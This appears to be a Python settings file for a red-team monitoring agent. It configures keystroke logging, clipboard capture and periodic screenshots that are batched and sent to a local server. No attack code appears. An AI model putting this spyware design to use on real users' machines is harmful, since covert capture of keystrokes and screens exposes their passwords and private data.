# General configuration settings for the agent
SERVER_URL = "http://localhost:8000"
METRICS_INTERVAL = 60 # seconds between sending heartbeat metrics to server
AGENT_FILE = "data/agent_id.txt"

# --------------------
# Read Team Activity:
# --------------------

# Keylogger configuration
KEYLOG_FILE = "data/keylog.jsonl"
KEYLOG_FLUSH_INTERVAL = 5 # seconds
KEYLOG_BATCH_SIZE = 20 # number of entries before flush
LAST_APP_CHECK = 0 # timestamp of last app check
APP_CACHE_TTL = 1  # seconds to cache active app name before re-checking
KEYLOG_SEND_INTERVAL = 60 # seconds between sending logs to server

# Clipboard configuration
CLIPBOARD_FILE = "data/clipboard.jsonl"
CLIPBOARD_FLUSH_INTERVAL = 5 # seconds
CLIPBOARD_BATCH_SIZE = 20 # number of entries before flush
CLIPBOARD_SEND_INTERVAL = 60 # seconds between sending logs to server
CLIPBOARD_MIN_LENGTH = 2 # minimum clipboard content length
CLIPBOARD_MAX_LENGTH = 1000 # maximum clipboard content length

# Screenshot configuration
SCREENSHOT_FOLDER = "data/screenshots/"
SCREENSHOT_MAX_COUNT = 100 # maximum number of screenshots to keep in the folder
SCREENSHOT_INTERVAL = 60  # seconds between screenshots
SCREENSHOT_QUALITY = 10  # JPEG quality for compression (0-100)